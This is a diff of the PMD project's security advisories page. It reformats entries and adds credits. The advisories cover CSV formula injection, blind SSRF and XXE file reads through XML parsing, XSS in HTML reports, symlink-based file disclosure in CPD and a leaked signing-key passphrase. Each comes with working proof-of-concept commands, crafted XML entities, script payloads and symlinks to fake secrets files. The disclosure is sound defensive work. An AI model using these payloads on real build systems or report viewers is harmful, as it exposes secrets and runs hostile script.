@@ -8,6 +8,40 @@ last_updated: October 2026 (7.29.0)
 For reporting security issues, see [SECURITY.md](https://github.com/pmd/pmd/blob/main/SECURITY.md).
 
 ## Security Vulnerabilities
+{% comment %}
+Template:
+
+### TODO GHSA / CVE Number
+**Published:** YYYY-MM-DD
+
+**CVE:** Requested / CVE-YYYY-NNNNNN
+
+**Severity:** High/Medium(==Moderate)/Low
+
+**Summary:**
+
+**Versions Affected:**
+
+**Description:**
+
+**Details:**
+
+**PoC:**
+
+**Impact:**
+
+**Fixes:**
+* See [#PR TODO](https://github.com/pmd/pmd/pull/TODO) TODO
+
+**Credits:**
+* Reported by [Name](https://github.com/user) (@user)
+* Independently reported by [Name](https://github.com/user) (@user)
+
+**References:**
+* [GHSA-TODO](https://github.com/pmd/pmd/security/advisories/GHSA-TODO) - Title
+* [CVE-TODO](https://www.cve.org/CVERecord?id=CVE-TODO)
+{% endcomment %}
+
 ### GHSA-jm8j-h474-h54h
 **Published:** 2026-10-30
 
@@ -40,34 +74,34 @@ beginning with `=`. The generated CSV contains a formula cell.
 
 Setup: PMD 7.28.0 binary distribution.
 
-1. Create a Java source file:
-```
-cat > 'pfx",=1+1,".java' <<'EOF'
-class Trigger {
-    void run() {
-        try {
-        } catch (Exception ignored) {
+1.  Create a Java source file:
+    ```
+    cat > 'pfx",=1+1,".java' <<'EOF'
+    class Trigger {
+        void run() {
+            try {
+            } catch (Exception ignored) {
+            }
         }
     }
-}
-EOF
-```
+    EOF
+    ```
 
-2. Run PMD with the CSV renderer:
-```
-pmd check \
-  -d . \
-  -R category/java/errorprone.xml \
-  -f csv \
-  -r report.csv \
-  --no-cache
-```
+2.  Run PMD with the CSV renderer:
+    ```
+    pmd check \
+      -d . \
+      -R category/java/errorprone.xml \
+      -f csv \
+      -r report.csv \
+      --no-cache
+    ```
 
-3. Inspect the created report:
-```
-"Problem","Package","File","Priority","Line","Description","Rule set","Rule"
-"1","","./pfx",=1+1,".java","3","4","Avoid catching Exception in try-catch block","Error Prone","AvoidCatchingGenericException"
-```
+3.  Inspect the created report:
+    ```
+    "Problem","Package","File","Priority","Line","Description","Rule set","Rule"
+    "1","","./pfx",=1+1,".java","3","4","Avoid catching Exception in try-catch block","Error Prone","AvoidCatchingGenericException"
+    ```
 
 A CSV parser reads `=1+1` as its own cell; the row has now 10 fields instead of 8.
 
@@ -82,8 +116,12 @@ reproduction demonstrates formula injection; it does not demonstrate data theft 
 The other fields are affected as well: if the attacker controls the executed ruleset, a rule name,
 ruleset name or rule message can inject a formula, either by the same quote breakout or simply by starting with `=`.
 
-**Fixes**
+**Fixes:**
 * See [#7262](https://github.com/pmd/pmd/issues/7262): \[core] Fix missing escaping in CSV renderers
+
+**Credits:**
+* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)
+* Independently reported by [Hama1cco](https://github.com/Hama1cco) (@Hama1cco)
 
 **References:**
 * [GHSA-jm8j-h474-h54h](https://github.com/pmd/pmd/security/advisories/GHSA-jm8j-h474-h54h) - Formula injection in CSV report format via unescaped quotes in file names
@@ -122,44 +160,44 @@ attacker-chosen URL during analysis.
 
 Setup: PMD 7.28.0 binary distribution. An SFDX project with a crafted `field-meta.xml` file.
 
-1. Create an empty file `probe.dtd`:
-```
-touch probe.dtd
-```
+1.  Create an empty file `probe.dtd`:
+    ```
+    touch probe.dtd
+    ```
 
-2. Start a web server on 127.0.0.1:8000 in the directory containing `probe.dtd` in a second terminal:
-```
-jwebserver -p 8000
-```
+2.  Start a web server on 127.0.0.1:8000 in the directory containing `probe.dtd` in a second terminal:
+    ```
+    jwebserver -p 8000
+    ```
 
-3. Create a small SFDX sample project to analyze:
-```
-mkdir -p objects/Account/fields
-cat > objects/Account/fields/Hit__c.field-meta.xml <<'EOF'
-<!DOCTYPE CustomField SYSTEM 'http://127.0.0.1:8000/probe.dtd'>
-<CustomField>
-  <fullName>Hit__c</fullName>
-  <type>Text</type>
-</CustomField>
-EOF
+3.  Create a small SFDX sample project to analyze:
+    ```
+    mkdir -p objects/Account/fields
+    cat > objects/Account/fields/Hit__c.field-meta.xml <<'EOF'
+    <!DOCTYPE CustomField SYSTEM 'http://127.0.0.1:8000/probe.dtd'>
+    <CustomField>
+      <fullName>Hit__c</fullName>
+      <type>Text</type>
+    </CustomField>
+    EOF
 
-mkdir -p pages
-cat > pages/page.page <<'EOF'
-<apex:page standardController="Account">
-  <apex:outputText value="{!Account.Hit__c}" escape="false"/>
-</apex:page>
-EOF
-```
+    mkdir -p pages
+    cat > pages/page.page <<'EOF'
+    <apex:page standardController="Account">
+      <apex:outputText value="{!Account.Hit__c}" escape="false"/>
+    </apex:page>
+    EOF
+    ```
 
-4. Execute PMD:
-```
-pmd check --no-progress --no-cache -d . -R category/visualforce/security.xml
-```
+4.  Execute PMD:
+    ```
+    pmd check --no-progress --no-cache -d . -R category/visualforce/security.xml
+    ```
 
-5. Observe the request in the web server log:
-```
-127.0.0.1 - - [09/Oct/2026:15:31:38 +0200] "GET /probe.dtd HTTP/1.1" 200 -
-```
+5.  Observe the request in the web server log:
+    ```
+    127.0.0.1 - - [09/Oct/2026:15:31:38 +0200] "GET /probe.dtd HTTP/1.1" 200 -
+    ```
 
 This confirms blind external DTD network access.
 
@@ -179,6 +217,9 @@ such as pull requests.
 
 **Fixes:**
 * See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing
+
+**Credits:**
+* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)
 
 **References:**
 * [GHSA-wv72-2ccf-28gj](https://github.com/pmd/pmd/security/advisories/GHSA-wv72-2ccf-28gj) - Blind SSRF through Visualforce metadata parser
@@ -200,6 +241,7 @@ such as pull requests.
 * net.sourceforge.pmd:pmd-test-schema >= 6.48.0, <= 7.28.0
 
 **Description:**
+
 PMD provides a custom test framework for testing rules. The test cases are defined in an XML rule-tests file.
 `pmd-test-schema` parses these rule-tests XML files with external entities enabled. A crafted XML rule-tests
 file can cause the process running PMD rule tests to read a local file and place its contents in a parsed test
@@ -217,55 +259,55 @@ description. This was reproduced against PMD’s actual parser.
 
 **PoC:**
 
-1. Create a file that should be read:
-```
-mkdir LOCAL_FILE
-printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;\nDATABASE_PASSWORD = super_secret_prod_password_12345;\n' > LOCAL_FILE/secrets.txt
-```
+1.  Create a file that should be read:
+    ```
+    mkdir LOCAL_FILE
+    printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;\nDATABASE_PASSWORD = super_secret_prod_password_12345;\n' > LOCAL_FILE/secrets.txt
+    ```
 
-2. Check out PMD (this would be done by CI):
-```
-git clone --depth=1 --single-branch https://github.com/pmd/pmd.git
-```
+2.  Check out PMD (this would be done by CI):
+    ```
+    git clone --depth=1 --single-branch https://github.com/pmd/pmd.git
+    ```
 
-3. Replace a rule-tests XML file with malicious content (this would be done in the PR):
-```
-cat > pmd/pmd-apex/src/test/resources/net/sourceforge/pmd/lang/apex/rule/bestpractices/xml/ApexAssertionsShouldIncludeMessage.xml <<'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test-data [<!ENTITY leak SYSTEM '../../../LOCAL_FILE/secrets.txt'>]>
-<test-data
-        xmlns="http://pmd.sourceforge.net/rule-tests"
-        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-        xsi:schemaLocation="http://pmd.sourceforge.net/rule-tests http://pmd.sourceforge.net/rule-tests_1_0_0.xsd">
-    <test-code>
-        <description>&leak;</description>
-        <expected-problems>1</expected-problems>
-        <code>public class Foo {}</code>
-    </test-code>
+3.  Replace a rule-tests XML file with malicious content (this would be done in the PR):
+    ```
+    cat > pmd/pmd-apex/src/test/resources/net/sourceforge/pmd/lang/apex/rule/bestpractices/xml/ApexAssertionsShouldIncludeMessage.xml <<'EOF'
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE test-data [<!ENTITY leak SYSTEM '../../../LOCAL_FILE/secrets.txt'>]>
+    <test-data
+            xmlns="http://pmd.sourceforge.net/rule-tests"
+            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+            xsi:schemaLocation="http://pmd.sourceforge.net/rule-tests http://pmd.sourceforge.net/rule-tests_1_0_0.xsd">
+        <test-code>
+            <description>&leak;</description>
+            <expected-problems>1</expected-problems>
+            <code>public class Foo {}</code>
+        </test-code>
 
-    <!-- some more text, so that the file is longer than the injected description of the test case above. -->
-</test-data>
-EOF
-```
+        <!-- some more text, so that the file is longer than the injected description of the test case above. -->
+    </test-data>
+    EOF
+    ```
 
-4. Run the build with Maven:
-```
-pmd/mvnw -f pmd/pom.xml -PfastSkip \
-   -Dtest=ApexAssertionsShouldIncludeMessageTest \
-   -Dsurefire.failIfNoSpecifiedTests=false \
-  verify
-```
+4.  Run the build with Maven:
+    ```
+    pmd/mvnw -f pmd/pom.xml -PfastSkip \
+       -Dtest=ApexAssertionsShouldIncludeMessageTest \
+       -Dsurefire.failIfNoSpecifiedTests=false \
+      verify
+    ```
 
-5. The test failure shows the content of the local file:
-```
-[INFO] Running net.sourceforge.pmd.lang.apex.rule.bestpractices.ApexAssertionsShouldIncludeMessageTest
---------------------------------------------------------------
-Test Failure: AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;
-DATABASE_PASSWORD = super_secret_prod_password_12345;
- -> Expected 1 problem(s), 0 problem(s) found.
- -> Expected messages: []
- -> Expected begin line numbers: []
-```
+5.  The test failure shows the content of the local file:
+    ```
+    [INFO] Running net.sourceforge.pmd.lang.apex.rule.bestpractices.ApexAssertionsShouldIncludeMessageTest
+    --------------------------------------------------------------
+    Test Failure: AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY;
+    DATABASE_PASSWORD = super_secret_prod_password_12345;
+     -> Expected 1 problem(s), 0 problem(s) found.
+     -> Expected messages: []
+     -> Expected begin line numbers: []
+    ```
 
 Note: This can also be easily reproduced with the example project for custom rules at https://github.com/pmd/pmd-examples/tree/main/custom-rules/maven-java
 
@@ -285,6 +327,9 @@ exfiltrated through the build logs. These logs are usually available through the
 **Fixes:**
 * See [#7261](https://github.com/pmd/pmd/pull/7261) \[core] Disallow external entity expansions/DTD in XML parsing
 
+**Credits:**
+* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)
+
 **References:**
 * [GHSA-9hm5-r2r7-hjcq](https://github.com/pmd/pmd/security/advisories/GHSA-9hm5-r2r7-hjcq) - Local file reads through XXE in PMD rule tests
 
@@ -303,6 +348,7 @@ exfiltrated through the build logs. These logs are usually available through the
 * net.sourceforge.pmd:pmd-core 7.28.0 and earlier
 
 **Description:**
+
 PMD's `pmd-core` HTML renderers place attacker-controlled ruleset metadata into generated HTML
 without context-appropriate escaping or URL-scheme validation. A crafted custom ruleset can inject executable
 markup into a `summaryhtml` or `html` report when suppressed violations are rendered (`--show-suppressed`).
@@ -331,66 +377,63 @@ missing validation in `RuleFactory`:
 
 These examples use only a harmless `alert()` call.
 
-1. Define a ruleset with crafted `externalInfoUrl` values and two test sources:
+1.  Define a ruleset with crafted `externalInfoUrl` values and two test sources:
+    ```
+    cat > rs.xml <<'EOF'
+    <?xml version="1.0" encoding="UTF-8"?>
+    <ruleset name="PoC" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
+      <description>Local synthetic test</description>
+      <rule name="AttrPoc" language="java"
+            class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
+            message="Synthetic violation"
+            externalInfoUrl="&quot;&gt;&lt;img src=x onerror=&quot;alert('attribute')&quot;&gt;">
+        <description>Local synthetic test rule</description>
+        <priority>3</priority>
+        <properties>
+          <property name="xpath" value="//ClassDeclaration"/>
+        </properties>
+      </rule>
 
-```
-cat > rs.xml <<'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<ruleset name="PoC" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
-  <description>Local synthetic test</description>
-  <rule name="AttrPoc" language="java"
-        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
-        message="Synthetic violation"
-        externalInfoUrl="&quot;&gt;&lt;img src=x onerror=&quot;alert('attribute')&quot;&gt;">
-    <description>Local synthetic test rule</description>
-    <priority>3</priority>
-    <properties>
-      <property name="xpath" value="//ClassDeclaration"/>
-    </properties>
-  </rule>
+      <rule name="JsUriPoc" language="java"
+            class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
+            message="Synthetic violation"
+            externalInfoUrl="javascript:alert('scheme')">
+        <description>Local synthetic test rule</description>
+        <priority>3</priority>
+        <properties>
+          <property name="xpath" value="//ClassDeclaration"/>
+        </properties>
+      </rule>
+    </ruleset>
+    EOF
 
-  <rule name="JsUriPoc" language="java"
-        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule"
-        message="Synthetic violation"
-        externalInfoUrl="javascript:alert('scheme')">
-    <description>Local synthetic test rule</description>
-    <priority>3</priority>
-    <properties>
-      <property name="xpath" value="//ClassDeclaration"/>
-    </properties>
-  </rule>
-</ruleset>
-EOF
+    mkdir -p src
+    echo 'class T {} // NOPMD' > src/T.java
+    echo 'class U {}' > src/U.java
+    ```
 
-mkdir -p src
-echo 'class T {} // NOPMD' > src/T.java
-echo 'class U {}' > src/U.java
-```
+2.  Generate the reports:
+    ```
+    pmd check --no-progress --no-cache --show-suppressed \
+      -d src/T.java -R rs.xml -f summaryhtml -r summary.html \
+      --no-fail-on-violation
 
-2. Generate the reports:
+    pmd check --no-progress --no-cache --show-suppressed \
+      -d src/T.java -R rs.xml -f html -r report.html \
+      --no-fail-on-violation
 
-```
-pmd check --no-progress --no-cache --show-suppressed \
-  -d src/T.java -R rs.xml -f summaryhtml -r summary.html \
-  --no-fail-on-violation
+    pmd check --no-progress --no-cache \
+      -d src/U.java -R rs.xml/JsUriPoc -f html -r report-jsuri.html \
+      --no-fail-on-violation
+    ```
 
-pmd check --no-progress --no-cache --show-suppressed \
-  -d src/T.java -R rs.xml -f html -r report.html \
-  --no-fail-on-violation
-
-pmd check --no-progress --no-cache \
-  -d src/U.java -R rs.xml/JsUriPoc -f html -r report-jsuri.html \
-  --no-fail-on-violation
-```
-
-3. Observe the issues:
-
-*   `summary.html` and `report.html` contain `<img src=x onerror="alert('attribute')">`. Opening the
-    report in a browser runs the script.
-*   `summary.html` and `report.html` contain a link `<a href="javascript:alert('scheme')">JsUriPoc</a>`.
-    Clicking the link runs the script.
-*   `report-jsuri.html` contains a link `<a href="javascript:alert('scheme')">Synthetic violation</a>`. 
-    Clicking the link runs the script.
+3.  Observe the issues:
+   *   `summary.html` and `report.html` contain `<img src=x onerror="alert('attribute')">`. Opening the
+       report in a browser runs the script.
+   *   `summary.html` and `report.html` contain a link `<a href="javascript:alert('scheme')">JsUriPoc</a>`.
+       Clicking the link runs the script.
+   *   `report-jsuri.html` contains a link `<a href="javascript:alert('scheme')">Synthetic violation</a>`. 
+       Clicking the link runs the script.
 
 
 **Expected:** The `externalInfoUrl` is properly escaped when used in the `href` attribute of a link element,
@@ -412,6 +455,9 @@ Script access is limited by the origin and browser policy under which the report
 **Fixes:**
 * See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
 
+**Credits:**
+* Reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)
+
 **References:**
 * [CVE-2026-28338](https://github.com/advisories/GHSA-8rr6-2qw5-pc7r) - Stored XSS in HTML renderers via unescaped violation messages
 * [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
@@ -432,6 +478,7 @@ Script access is limited by the origin and browser policy under which the report
 * net.sourceforge.pmd:pmd-core 7.28.0 and earlier
 
 **Description:**
+
 PMD's `summaryhtml` report format prints a summary table of rule names and their violation counts. The renderer writes
 the rule name straight into the HTML with no escaping. A rule name that contains markup is emitted verbatim, so a
 report opened in a browser executes the script. This is the same weakness class as [CVE-2026-28338](#CVE-2026-28338),
@@ -456,34 +503,31 @@ a ruleset from an untrusted source.
 
 Setup: PMD 7.27.0 binary distribution. A ruleset whose rule name carries the payload.
 
-1. Define a rule whose name is an XSS payload
+1.  Define a rule whose name is an XSS payload
+    ```
+    cat > rs.xml <<'EOF'
+    <?xml version="1.0"?>
+    <ruleset name="poc" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
+      <description>poc</description>
+      <rule name="&lt;script&gt;alert(document.domain)&lt;/script&gt;"
+            language="java" message="hit"
+            class="net.sourceforge.pmd.lang.rule.xpath.XPathRule">
+        <properties><property name="xpath"><value>//ClassDeclaration</value></property></properties>
+      </rule>
+    </ruleset>
+    EOF
+    mkdir -p src && echo 'public class A { void m() {} }' > src/A.java
+    ```
 
-```
-cat > rs.xml <<'EOF'
-<?xml version="1.0"?>
-<ruleset name="poc" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
-  <description>poc</description>
-  <rule name="&lt;script&gt;alert(document.domain)&lt;/script&gt;"
-        language="java" message="hit"
-        class="net.sourceforge.pmd.lang.rule.xpath.XPathRule">
-    <properties><property name="xpath"><value>//ClassDeclaration</value></property></properties>
-  </rule>
-</ruleset>
-EOF
-mkdir -p src && echo 'public class A { void m() {} }' > src/A.java
-```
+2.  Generate the summaryhtml report
+    ```
+    pmd check -d src -R rs.xml -f summaryhtml --no-cache
+    ```
 
-2. Generate the summaryhtml report
-
-```
-pmd check -d src -R rs.xml -f summaryhtml --no-cache
-```
-
-3. Read the emitted HTML
-
-```
-<tr><td><script>alert(document.domain)</script></td><td align=center>1</td></tr>
-```
+3.  Read the emitted HTML
+    ```
+    <tr><td><script>alert(document.domain)</script></td><td align=center>1</td></tr>
+    ```
 
 The rule name is written into the table cell unescaped. Opening the report in a browser runs the script.
 
@@ -499,6 +543,10 @@ act with the viewer's session there.
 
 **Fixes:**
 * See [#7260](https://github.com/pmd/pmd/pull/7260) \[core] HTMLRenderers: Properly escape rule name and externalInfoUrl
+
+**Credits:**
+* Reported by [Dan](https://github.com/7alen7) (@7alen7)
+* Independently reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney)
 
 **References:**
 * [GHSA-x2h8-xxj6-pf6c](https://github.com/pmd/pmd/security/advisories/GHSA-x2h8-xxj6-pf6c) - XSS via rule name in summaryhtml report format
@@ -518,6 +566,7 @@ act with the viewer's session there.
 * net.sourceforge.pmd:pmd-core 7.28.0 and earlier, starting with 6.54.0
 
 **Description:**
+
 CPD is the copy-paste detector shipped with PMD. It walks a directory of source files, tokenizes them, and reports
 duplicated regions along with the duplicated source text. The directory walk follows symbolic links, and the file
 reader applies no check that a resolved file stays inside the scanned tree. An attacker who controls the files in a
@@ -545,39 +594,35 @@ Setup: PMD 7.27.0 binary distribution (pmd-dist-7.27.0-bin.zip). No account or p
 needs to place files in a directory that CPD is later run against, which is the normal position of a PR author or a
 package submitter.
 
-1. Stage a secret outside the project and two symlinks inside it
+1.  Stage a secret outside the project and two symlinks inside it
+    ```shell
+    mkdir -p project OUTSIDE_THE_REPO
+    printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;\nDATABASE_PASSWORD = super_secret_prod_password_12345 ;\nGITHUB_TOKEN = ghp_fake_token_for_poc_000 ;\nSTRIPE_KEY = sk_live_fake_key_for_poc_000 ;\nMORE = padding to exceed the token threshold ;\n' > OUTSIDE_THE_REPO/ci_secret.env
+    ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_a.java
+    ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_b.java
+    ```
+    The project directory contains only two symlinks. The secret lives outside it.
 
-```shell
-mkdir -p project OUTSIDE_THE_REPO
-printf 'AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;\nDATABASE_PASSWORD = super_secret_prod_password_12345 ;\nGITHUB_TOKEN = ghp_fake_token_for_poc_000 ;\nSTRIPE_KEY = sk_live_fake_key_for_poc_000 ;\nMORE = padding to exceed the token threshold ;\n' > OUTSIDE_THE_REPO/ci_secret.env
-ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_a.java
-ln -s ../OUTSIDE_THE_REPO/ci_secret.env project/copy_b.java
-```
+2.  Run CPD the way a CI job does
+    ```shell
+    pmd cpd --minimum-tokens 10 --language java --dir project --format text
+    ```
 
-The project directory contains only two symlinks. The secret lives outside it.
-
-2. Run CPD the way a CI job does
-
-```shell
-pmd cpd --minimum-tokens 10 --language java --dir project --format text
-```
-
-3. Read the target file's contents back out of the report
-
-```
-Found a 5 line (15 tokens) duplication in the following files:
-Starting at line 1 of .../project/copy_a.java
-Starting at line 1 of .../project/copy_b.java
-
-AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;
-DATABASE_PASSWORD = super_secret_prod_password_12345 ;
-GITHUB_TOKEN = ghp_fake_token_for_poc_000 ;
-STRIPE_KEY = sk_live_fake_key_for_poc_000 ;
-MORE = padding to exceed the token threshold ;
-```
-
-The contents of `OUTSIDE_THE_REPO/ci_secret.env`, a file that was never inside the scanned directory, appear verbatim
-in the report.
+3.  Read the target file's contents back out of the report
+    ```
+    Found a 5 line (15 tokens) duplication in the following files:
+    Starting at line 1 of .../project/copy_a.java
+    Starting at line 1 of .../project/copy_b.java
+    
+    AWS_SECRET_ACCESS_KEY = wJalrXUtnFEMI...EXAMPLEKEY ;
+    DATABASE_PASSWORD = super_secret_prod_password_12345 ;
+    GITHUB_TOKEN = ghp_fake_token_for_poc_000 ;
+    STRIPE_KEY = sk_live_fake_key_for_poc_000 ;
+    MORE = padding to exceed the token threshold ;
+    ```
+    
+    The contents of `OUTSIDE_THE_REPO/ci_secret.env`, a file that was never inside the scanned directory, appear verbatim
+    in the report.
 
 **Expected:** CPD analyzes files within the directory it is given and does not read or disclose files outside it based
 on symlinks committed by the analyzed project.
@@ -604,6 +649,10 @@ the runner that holds the secrets. Scanning untrusted source is the intended use
 **Fixes:**
 *   See [#7259](https://github.com/pmd/pmd/pull/7259) \[core] Don't follow symlinks in FileCollector
 
+**Credits:**
+*   Reported by [Dan](https://github.com/7alen7) (@7alen7).
+*   Independently reported by [lapeace](https://github.com/ThejasRajamoney) (@ThejasRajamoney).
+
 **References:**
 *   [GHSA-wj6q-xw9m-26p6](https://github.com/pmd/pmd/security/advisories/GHSA-wj6q-xw9m-26p6) - Arbitrary file disclosure in CPD via symlinks in analyzed sources
 
@@ -620,6 +669,7 @@ the runner that holds the secrets. Scanning untrusted source is the intended use
 * net.sourceforge.pmd:pmd-core 7.21.0 and earlier
 
 **Description:**
+
 PMD's `vbhtml` and `yahtml` report formats insert rule violation messages into HTML output without escaping.
 When PMD analyzes untrusted source code containing crafted string literals, the generated HTML report contains
 executable JavaScript that runs when opened in a browser.
@@ -629,6 +679,7 @@ While the default `html` format is not affected via rule violation messages (it 
 The user supplied message (the reason for the suppression) was not escaped.
 
 **Details:**
+
 `VBHTMLRenderer.java` line 71 appends `rv.getDescription()` directly into HTML:
 
 ```java
@@ -696,11 +747,14 @@ artifact. JavaScript executes in the browser context of anyone who opens the rep
 Practical impact is limited because `vbhtml` and `yahtml` are legacy formats rarely used in practice.
 The default `html` format has a similar issue with user messages from suppressed violations.
 
-**Fixes**
+**Fixes:**
 * See [#6475](https://github.com/pmd/pmd/issues/6475): \[core] Fix stored XSS in VBHTMLRenderer and YAHTMLRenderer
 
+**Credits:**
+* Reported by [Smaran Chand](https://github.com/smaranchand) (@smaranchand)
+
 **References:**
-* [GHSA-8rr6-2qw5-pc7r](https://github.com/pmd/pmd/security/advisories/GHSA-8rr6-2qw5-pc7r)
+* [GHSA-8rr6-2qw5-pc7r](https://github.com/pmd/pmd/security/advisories/GHSA-8rr6-2qw5-pc7r) - Stored XSS in HTML renderers via unescaped violation messages
 * [CVE-2026-28338](https://www.cve.org/CVERecord?id=CVE-2026-28338)
 
 ### CVE-2025-23215
@@ -722,7 +776,8 @@ The default `html` format has a similar issue with user messages from suppressed
 While rebuilding [PMD Designer](https://github.com/pmd/pmd-designer) for Reproducible Builds and digging into issues,
 I found out that passphrase for `gpg.keyname=0xD0BF1D737C9A1C22` is included in jar published to Maven Central.
 
-**Details**
+**Details:**
+
 See https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/README.md
 
 I removed 2 lines from https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.diffoscope
@@ -748,12 +803,13 @@ but real content is:
 │  openjfx.scope=provided
 ```
 
-**PoC**
+**PoC:**
 ```
 ./rebuild.sh content/net/sourceforge/pmd/pmd-designer/pmd-designer-7.0.0.buildspec
 ```
 
 **Impact**
+
 After further analysis, the passphrase of the following two keys have been compromised:
 
 1. `94A5 2756 9CAF 7A47 AFCA  BDE4 86D3 7ECA 8C2E 4C5B`: PMD Designer (Release Signing Key) <releases@pmd-code.org>
@@ -783,14 +839,16 @@ please share with us.
 Note, the module `net.sourceforge.pmd:pmd-ui` has been renamed to `net.sourceforge.pmd:pmd-designer` since PMD 7,
 so there won't be a fixed version for `pmd-ui`.
 
-**Fixes**
+**Fixes:**
 * Reworked build script in PMD Designer to not include all system properties
     * https://github.com/pmd/pmd-designer/commit/1548f5f27ba2981b890827fecbd0612fa70a0362
     * https://github.com/pmd/pmd-designer/commit/e87a45312753ec46b3e5576c6f6ac1f7de2f5891
 
+**Credits:**
+* Reported by [Hervé Boutemy](https://github.com/hboutemy) (@hboutemy)
 
 **References:**
-* [GHSA-88m4-h43f-wx84](https://github.com/pmd/pmd/security/advisories/GHSA-88m4-h43f-wx84)
+* [GHSA-88m4-h43f-wx84](https://github.com/pmd/pmd/security/advisories/GHSA-88m4-h43f-wx84) - Release key passphrase (GPG) available on Maven Central in cleartext
 * [CVE-2025-23215](https://www.cve.org/CVERecord?id=CVE-2025-23215)
 * [reproducible-central](https://github.com/jvm-repo-rebuild/reproducible-central?tab=readme-ov-file#reproducible-builds-for-maven-central-repository)
 
